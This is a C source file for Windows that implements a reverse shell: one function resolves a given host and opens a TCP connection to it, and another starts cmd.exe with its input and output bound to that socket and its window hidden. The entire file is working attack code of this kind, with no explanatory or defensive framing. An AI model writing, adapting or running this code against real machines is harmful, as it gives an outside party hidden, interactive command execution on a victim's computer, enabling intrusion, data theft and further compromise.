#include <windef.h>
#include <winsock2.h>
#include <stdio.h>

#include "reverse_shell.h"

/** CMD EXE File Name */
const char * CMD = "cmd.exe";

/**
 * Attach socket to a process.
 *
 * @arg winsock: wsa socket fd
 *
 * @return != RS_ERROR_OK on error
 */
static RS_ERROR attachProcess(SOCKET winsock) {

    STARTUPINFO start_proc;
    PROCESS_INFORMATION info_proc;

    memset(&start_proc, 0, sizeof start_proc);
    memset(&info_proc, 0, sizeof info_proc);

    start_proc.cb = sizeof start_proc;
    start_proc.dwFlags = STARTF_USESTDHANDLES + STARTF_USESHOWWINDOW;
    start_proc.hStdInput = start_proc.hStdOutput =
            start_proc.hStdError = (HANDLE) winsock;
    start_proc.wShowWindow = SW_HIDE;

    if (CreateProcess(NULL, CMD, NULL, NULL, TRUE, 0, NULL, NULL,
            &start_proc, &info_proc) == 0) {
        ERROR_MSG("Could not create proccess <%s>.", CMD);
        return RS_ERROR_CREATE_PROCCESS;
    }

    WaitForSingleObject(info_proc.hProcess, INFINITE);

    return RS_ERROR_OK;

}

/**
 * Callback connect.
 *
 * @arg host: destination host
 * @arg port: destination port
 *
 * @ret != RS_ERROR_OK on error
 */
RS_ERROR reverseShell(const char *host, u_short port) {

    SOCKET winsock;
    SOCKADDR_IN winsock_in;
    struct hostent *Dire;
    char *ip;
    int ret;

    if ((Dire = gethostbyname(host)) == NULL) {
        ERROR_MSG("Could not get host: <%s>", host);
        return RS_ERROR_RESOLVE;
    }

    ip = inet_ntoa(*((struct in_addr *) Dire->h_addr));

    winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    memset(&winsock_in, 0, sizeof winsock_in);

    winsock_in.sin_port = htons(port);
    winsock_in.sin_family = AF_INET;
    winsock_in.sin_addr.s_addr = inet_addr(ip);

    if (WSAConnect(winsock, (SOCKADDR *) & winsock_in, sizeof winsock_in, NULL,
            NULL, NULL, NULL) == SOCKET_ERROR) {
        ERROR_MSG("Could not connect on host: <%s> ip: <%s>", host, ip);
        return RS_ERROR_CONNECT;
    }

    ret = attachProcess(winsock);

    closesocket(winsock);

    return ret;
}

